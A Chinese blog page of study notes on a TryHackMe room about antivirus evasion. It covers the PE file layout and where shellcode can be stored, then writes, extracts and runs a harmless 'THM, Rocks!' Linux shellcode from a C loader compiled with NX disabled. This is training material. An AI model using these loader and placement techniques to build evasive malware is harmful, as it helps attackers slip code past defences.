<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>THM免杀学习AVEvasionShellcode | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="PE Structure此任务重点介绍 Windows 二进制文件的 PE 数据结构的一些高级基本元素。 什么是PE？ Windows 可执行文件格式，又名 PE（可移植可执行文件），是一种保存文件所需信息的数据结构。 它是一种在磁盘上组织可执行文件代码的方法。 Windows操作系统组件，例如Windows和DOS加载程序，可以将其加载到内存中，并根据在PE中找到的解析文件信息来执行它。 一般来">
<meta property="og:type" content="article">
<meta property="og:title" content="THM免杀学习AVEvasionShellcode">
<meta property="og:url" content="http://mikannse.space/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0AVEvasionShellcode/index.html">
<meta property="og:site_name" content="MikannseのSekai">
<meta property="og:description" content="PE Structure此任务重点介绍 Windows 二进制文件的 PE 数据结构的一些高级基本元素。 什么是PE？ Windows 可执行文件格式，又名 PE（可移植可执行文件），是一种保存文件所需信息的数据结构。 它是一种在磁盘上组织可执行文件代码的方法。 Windows操作系统组件，例如Windows和DOS加载程序，可以将其加载到内存中，并根据在PE中找到的解析文件信息来执行它。 一般来">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
<meta property="article:published_time" content="2024-04-08T06:56:54.000Z">
<meta property="article:modified_time" content="2024-06-14T03:30:02.700Z">
<meta property="article:author" content="Mikannse">
<meta property="article:tag" content="渗透测试">
<meta property="article:tag" content="笔记">
<meta property="article:tag" content="免杀">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0AVEvasionShellcode/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'THM免杀学习AVEvasionShellcode',
  isPost: true,
  isHome: false,
  isHighlightShrink: undefined,
  isToc: true,
  postUpdate: '2024-06-14 11:30:02'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (true) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">309</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">THM免杀学习AVEvasionShellcode</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-08T06:56:54.000Z" title="发表于 2024-04-08 14:56:54">2024-04-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-14T03:30:02.700Z" title="更新于 2024-06-14 11:30:02">2024-06-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">12.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>46分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="THM免杀学习AVEvasionShellcode"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="PE-Structure"><a href="#PE-Structure" class="headerlink" title="PE Structure"></a>PE Structure</h1><p>此任务重点介绍 Windows 二进制文件的 PE 数据结构的一些高级基本元素。</p>
<p>什么是PE？</p>
<p>Windows 可执行文件格式，又名 PE（可移植可执行文件），是一种保存文件所需信息的数据结构。 它是一种在磁盘上组织可执行文件代码的方法。 Windows操作系统组件，例如Windows和DOS加载程序，可以将其加载到内存中，并根据在PE中找到的解析文件信息来执行它。</p>
<p>一般来说，Windows 二进制文件（例如 EXE、DLL 和目标代码文件）的默认文件结构具有相同的 PE 结构，并且适用于 Windows 操作系统（x86 和 x64）CPU 架构。</p>
<p>PE 结构包含保存有关二进制文件的信息的各个部分，例如元数据和指向外部库的内存地址的链接。 这些部分之一是 <strong>PE 标头</strong>，其中包含元数据信息、指针以及内存中地址部分的链接。 另一部分是<strong>数据部分</strong>，其中包含容器，其中包含 Windows 加载程序运行程序所需的信息，例如可执行代码、资源、库链接、数据变量等。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ad61ff4aa1d4f649c02348dfa32eb613.png" alt="PE Structure"></p>
<p>PE结构中有不同类型的数据容器，每种数据容器保存不同的数据。</p>
<ol>
<li><strong>.text</strong> 存放程序的实际代码</li>
<li><strong>.data</strong>保存初始化和定义的变量</li>
<li><strong>.bss</strong> 保存未初始化的数据（未赋值的声明变量）</li>
<li><strong>.rdata</strong> 包含只读数据</li>
<li><strong>.edata</strong>：包含可导出的对象和相关的表信息</li>
<li><strong>.idata</strong>导入的对象及相关表信息</li>
<li><strong>.reloc</strong> 图像重定位信息</li>
<li><strong>.rsrc</strong> 链接程序使用的外部资源，例如图像、图标、嵌入式二进制文件和清单文件，其中包含有关程序版本、作者、公司和版权的所有信息！</li>
</ol>
<p>PE 结构是一个庞大而复杂的主题，我们不会过多讨论有关标头和数据部分的细节。 此任务提供 PE 结构的高级概述。 如果您有兴趣获得有关该主题的更多信息，我们建议您查看以下 THM 房间，其中对该主题进行了更详细的解释：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/windowsinternals">Windows 内部结构</a></li>
<li>剖析 PE 标头</li>
</ul>
<p>如果您查看 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format">Windows PE 格式</a> 的文档网站，您还可以获得有关 PE 的更深入的详细信息。</p>
<p>当查看 PE 内容时，我们会看到它包含一堆人类无法读取的字节。 但是，它包含加载程序运行文件所需的所有详细信息。 以下是 Windows 加载程序读取可执行二进制文件并将其作为进程运行的示例步骤。</p>
<ol>
<li><p>标头部分：解析 DOS、Windows 和可选标头以提供有关 EXE 文件的信息。 例如，</p>
</li>
<li><ul>
<li>幻数以“MZ”开头，它告诉加载程序这是一个 EXE 文件。</li>
<li>文件签名</li>
<li>文件是针对 x86 还是 x64 CPU 架构编译的。</li>
<li>创建时间戳。</li>
</ul>
</li>
</ol>
<p>3.解析节表详细信息，如</p>
<ol start="4">
<li><ul>
<li>文件包含的节数。</li>
</ul>
</li>
<li><p>将文件内容映射到内存中</p>
</li>
<li><ul>
<li>EntryPoint 地址和 ImageBase 的偏移量。</li>
<li>RVA：相对虚拟地址，与Imagebase相关的地址。</li>
</ul>
</li>
<li><p>导入、DLL 和其他对象被加载到内存中。</p>
</li>
<li><p>定位EntryPoint地址并运行主执行函数。</p>
</li>
</ol>
<p>为什么我们需要了解PE？</p>
<p>我们需要了解它有几个原因。 首先，由于我们正在处理打包和解包主题，因此该技术需要有关 PE 结构的详细信息。</p>
<p>另一个原因是反病毒软件和恶意软件分析人员根据 PE 标头和其他 PE 部分中的信息来分析 EXE 文件。 因此，要创建或修改针对 Windows 计算机的具有 AV 规避功能的恶意软件，我们需要了解 Windows 可移植可执行文件的结构以及恶意 shellcode 的存储位置。</p>
<p>我们可以通过定义和初始化 shellcode 变量的方式来控制在哪个数据节中存储 shellcode。 以下是一些示例，展示了如何在 PE 中存储 shellcode：</p>
<ol>
<li>在主函数中将 shellcode 定义为局部变量，会将其存储在 <strong>.TEXT</strong> PE 部分中。</li>
<li>将shellcode定义为全局变量会将其存储在**.Data**部分。</li>
<li>另一种技术涉及将 shellcode 作为原始二进制文件存储在图标图像中并将其链接到代码中，因此在本例中，它显示在 <strong>.rsrc</strong> 数据部分中。</li>
<li>我们可以添加自定义数据部分来存储shellcode。</li>
</ol>
<p>PE-bear</p>
<p>附加的虚拟机是一台 Windows 开发机器，具有解析 EXE 文件和读取我们讨论的详细信息所需的工具。 为了您的方便，我们在桌面上提供了 PE-Bear 软件的副本，它有助于检查 PE 结构：标题、部分等。PE-Bear 提供图形用户界面来显示所有相关的 EXE 详细信息。 要加载 EXE 文件进行分析，请选择 <strong>文件</strong> -&gt; <strong>加载 PE</strong> (Ctrl + O)。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c51856efd63b36680857498bac814469.png" alt="PE-Bear: The Main Windows"></p>
<p>文件加载后，我们可以看到所有 PE 详细信息。 以下屏幕截图显示了加载文件的 PE 详细信息，包括我们在此任务前面讨论的标头和部分。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/78dca06d1d1e4249f25734af8082b8be.png" alt="PE-Bear:Load a File"></p>
<h1 id="Introduction-to-Shellcode"><a href="#Introduction-to-Shellcode" class="headerlink" title="Introduction to Shellcode"></a>Introduction to Shellcode</h1><p>Shellcode 是一组精心设计的机器代码指令，告诉易受攻击的程序运行附加功能，并且在大多数情况下，提供对系统 shell 的访问或创建反向命令 shell。</p>
<p>   一旦shellcode被注入进程并由易受攻击的软件或程序执行，它就会修改代码运行流程以更新程序的寄存器和函数来执行攻击者的代码。</p>
<p>   它一般用汇编语言编写并翻译成十六进制操作码（操作码）。 编写独特的自定义 shellcode 有助于显着规避 AV 软件。 但是编写自定义 shellcode 需要出色的汇编语言知识和技能，这不是一件容易的事！</p>
<p>一个简单的 Shellcode！</p>
<p>为了编写您自己的 shellcode，需要一组技能：</p>
<ul>
<li>对 x86 和 x64 CPU 架构有很好的了解。</li>
<li>汇编语言。</li>
<li>对C等编程语言有丰富的了解。</li>
<li>熟悉Linux和Windows操作系统。</li>
</ul>
<p>为了生成我们自己的 shellcode，我们需要编写并从汇编机器代码中提取字节。 对于此任务，我们将使用 AttackBox 为 Linux 创建一个简单的 shellcode，用于写入字符串“THM，Rocks！”。 下面的汇编代码使用了两个主要函数：</p>
<ul>
<li>系统写入函数（sys_write）打印出我们选择的字符串。</li>
<li>系统退出函数（sys_exit）终止程序的执行。</li>
</ul>
<p>要调用这些函数，我们将使用<strong>系统调用</strong>。 系统调用是程序请求内核执行某些操作的方式。 在这种情况下，我们将请求内核向屏幕写入一个字符串，然后退出程序。 每个操作系统对于系统调用都有不同的调用约定，这意味着要在 Linux 中使用 write，您可能会使用与 Windows 上不同的系统调用。 对于64位Linux，您可以通过设置以下值从内核调用所需的函数：</p>
<table>
<thead>
<tr>
<th><strong>rax</strong></th>
<th><strong>System Call</strong></th>
<th><strong>rdi</strong></th>
<th><strong>rsi</strong></th>
<th><strong>rdx</strong></th>
</tr>
</thead>
<tbody><tr>
<td>0x1</td>
<td>sys_write</td>
<td>unsigned int fd</td>
<td>const char *buf</td>
<td>size_t count</td>
</tr>
<tr>
<td>0x3c</td>
<td>sys_exit</td>
<td>int error_code</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>上表告诉我们需要在不同处理器寄存器中设置哪些值才能使用系统调用调用 sys_write 和 sys_exit 函数。 对于64位Linux，rax寄存器用于指示我们希望调用的内核中的函数。 将rax设置为0x1将使内核执行sys_write，将rax设置为0x3c将使内核执行sys_exit。 这两个函数都需要一些参数才能工作，这些参数可以通过 rdi、rsi 和 rdx 寄存器进行设置。 您可以在<a target="_blank" rel="noopener" href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">此处</a>找到可用的 64 位 Linux 系统调用的完整参考。</p>
<p>对于“sys_write”，通过“rdi”发送的第一个参数是要写入的文件描述符。 “rsi”中的第二个参数是指向我们要打印的字符串的指针，“rdx”中的第三个参数是要打印的字符串的大小。</p>
<p>对于“sys_exit”，需要将 rdi 设置为程序的退出代码。 我们将使用代码0，这意味着程序成功退出。</p>
<p>将以下代码复制到 AttackBox 中名为“thm.asm”的文件中：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">global _start</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    jmp MESSAGE      ; 1) let's jump to MESSAGE</span><br><span class="line"></span><br><span class="line">GOBACK:</span><br><span class="line">    mov rax, 0x1</span><br><span class="line">    mov rdi, 0x1</span><br><span class="line">    pop rsi          ; 3) we are popping into `rsi`; now we have the</span><br><span class="line">                     ; address of "THM, Rocks!\r\n"</span><br><span class="line">    mov rdx, 0xd</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, 0x3c</span><br><span class="line">    mov rdi, 0x0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">MESSAGE:</span><br><span class="line">    call GOBACK       ; 2) we are going back, since we used `call`, that means</span><br><span class="line">                      ; the return address, which is, in this case, the address</span><br><span class="line">                      ; of "THM, Rocks!\r\n", is pushed into the stack.</span><br><span class="line">    db "THM, Rocks!", 0dh, 0ah</span><br></pre></td></tr></tbody></table></figure>

<p>让我们进一步解释一下 ASM 代码。 首先，我们的消息字符串存储在 .text 部分的末尾。 由于我们需要一个指向该消息的指针来打印它，因此我们将跳转到消息本身之前的调用指令。 当执行 call GOBACK 时，call 后的下一条指令的地址将被压入堆栈，该地址对应于我们的消息所在的位置。 请注意，消息末尾的 0dh、0ah 是相当于换行符 (\r\n) 的二进制文件。</p>
<p>接下来，程序启动 GOBACK 例程并为我们的第一个 sys_write() 函数准备所需的寄存器。</p>
<ul>
<li>我们通过在rax寄存器中存储1来指定sys_write函数。</li>
<li>我们将 rdi 设置为 1 以将字符串打印到用户控制台（STDOUT）。</li>
<li>我们弹出一个指向字符串的指针，该指针是在调用 GOBACK 时被压入的，并将其存储到 rsi 中。</li>
<li>通过 syscall 指令，我们使用准备好的值执行 sys_write 函数。</li>
<li>对于下一部分，我们执行相同的操作来调用 sys_exit 函数，因此我们将 0x3c 设置到 rax 寄存器中，并调用 syscall 函数来退出程序。</li>
</ul>
<p>接下来，我们编译并链接ASM代码以创建x64 Linux可执行文件并最终执行程序。</p>
<p> 汇编并链接我们的代码</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           user@AttackBox$ nasm -f elf64 thm.asm</span><br><span class="line">user@AttackBox$ ld thm.o -o thm</span><br><span class="line">user@AttackBox$ ./thm</span><br><span class="line">THM,Rocks!</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>

<p>我们使用 nasm 命令来编译 asm 文件，并指定 -f elf64 选项来指示我们正在为 64 位 Linux 进行编译。 请注意，结果我们获得了一个 .o 文件，其中包含目标代码，需要链接该文件才能成为工作可执行文件。 “ld”命令用于链接对象并获取最终的可执行文件。 “-o”选项用于指定输出可执行文件的名称。</p>
<p>现在我们已经编译了 ASM 程序，让我们使用 objdump 命令通过转储编译的二进制文件的 .text 部分来提取 shellcode。</p>
<p> 转储 .text 部分</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           user@AttackBox$ objdump -d thm</span><br><span class="line"></span><br><span class="line">thm:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000400080 &lt;_start&gt;:</span><br><span class="line">  400080:	eb 1e                	jmp    4000a0 </span><br><span class="line"></span><br><span class="line">0000000000400082 :</span><br><span class="line">  400082:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  400087:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40008c:	5e                   	pop    %rsi</span><br><span class="line">  40008d:	ba 0d 00 00 00       	mov    $0xd,%edx</span><br><span class="line">  400092:	0f 05                	syscall </span><br><span class="line">  400094:	b8 3c 00 00 00       	mov    $0x3c,%eax</span><br><span class="line">  400099:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  40009e:	0f 05                	syscall </span><br><span class="line"></span><br><span class="line">00000000004000a0 :</span><br><span class="line">  4000a0:	e8 dd ff ff ff       	callq  400082 </span><br><span class="line">  4000a5:	54                   	push   %rsp</span><br><span class="line">  4000a6:	48                   	rex.W</span><br><span class="line">  4000a7:	4d 2c 20             	rex.WRB sub $0x20,%al</span><br><span class="line">  4000aa:	52                   	push   %rdx</span><br><span class="line">  4000ab:	6f                   	outsl  %ds:(%rsi),(%dx)</span><br><span class="line">  4000ac:	63 6b 73             	movslq 0x73(%rbx),%ebp</span><br><span class="line">  4000af:	21                   	.byte 0x21</span><br><span class="line">  4000b0:	0d                   	.byte 0xd</span><br><span class="line">  4000b1:	0a                   	.byte 0xa</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>

<p>现在我们需要从上面的输出中提取十六进制值。 为此，我们可以使用 objcopy 将 .text 部分以二进制格式转储到名为 thm.text 的新文件中，如下所示：</p>
<p>提取 .text 部分</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ objcopy -j .text -O binary thm thm.text</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>

<p>thm.text 包含二进制格式的 shellcode，因此为了能够使用它，我们需要首先将其转换为十六进制。 <code>xxd</code> 命令有一个 <code>-i</code> 选项，它将直接以 C 字符串输出二进制文件：</p>
<p>输出相当于我们的 shellcode 的十六进制</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           user@AttackBox$ xxd -i thm.text</span><br><span class="line">unsigned char new_text[] = {</span><br><span class="line">  0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,</span><br><span class="line">  0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,</span><br><span class="line">  0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,</span><br><span class="line">  0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,</span><br><span class="line">  0x0d, 0x0a</span><br><span class="line">};</span><br><span class="line">unsigned int new_text_len = 50;</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>

<p>最后，我们得到了来自 ASM 程序集的格式化 shellcode。 蛮好玩的！ 正如我们所见，为您的工作生成 shellcode 需要奉献精神和技能！</p>
<p>为了确认提取的 shellcode 是否按我们的预期工作，我们可以执行 shellcode 并将其注入到 C 程序中。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> {</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> message[] = {</span><br><span class="line">        <span class="number">0xeb</span>, <span class="number">0x1e</span>, <span class="number">0xb8</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xbf</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x5e</span>, <span class="number">0xba</span>, <span class="number">0x0d</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0x3c</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0xbf</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0xe8</span>, <span class="number">0xdd</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">        <span class="number">0xff</span>, <span class="number">0x54</span>, <span class="number">0x48</span>, <span class="number">0x4d</span>, <span class="number">0x2c</span>, <span class="number">0x20</span>, <span class="number">0x52</span>, <span class="number">0x6f</span>, <span class="number">0x63</span>, <span class="number">0x6b</span>, <span class="number">0x73</span>, <span class="number">0x21</span>,</span><br><span class="line">        <span class="number">0x0d</span>, <span class="number">0x0a</span></span><br><span class="line">    };</span><br><span class="line">    </span><br><span class="line">    (*(<span class="type">void</span>(*)())message)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>然后，我们编译并执行如下，</p>
<p> 编译我们的C程序</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           user@AttackBox$ gcc -g -Wall -z execstack thm.c -o thmx</span><br><span class="line">user@AttackBox$ ./thmx</span><br><span class="line">THM,Rocks!</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>

<p>好的！ 有用。 请注意，我们通过禁用 NX 保护来编译 C 程序，这可能会阻止我们在数据段或堆栈中正确执行代码。</p>
<p>了解 shellcode 及其创建方式对于执行以下任务至关重要，尤其是在处理 shellcode 加密和编码时。</p>
<h1 id="Generate-Shellcode"><a href="#Generate-Shellcode" class="headerlink" title="Generate Shellcode"></a>Generate Shellcode</h1><p>在此任务中，我们将继续使用 shellcode 并演示如何使用 Metasploit 框架等公共工具生成和执行 shellcode。</p>
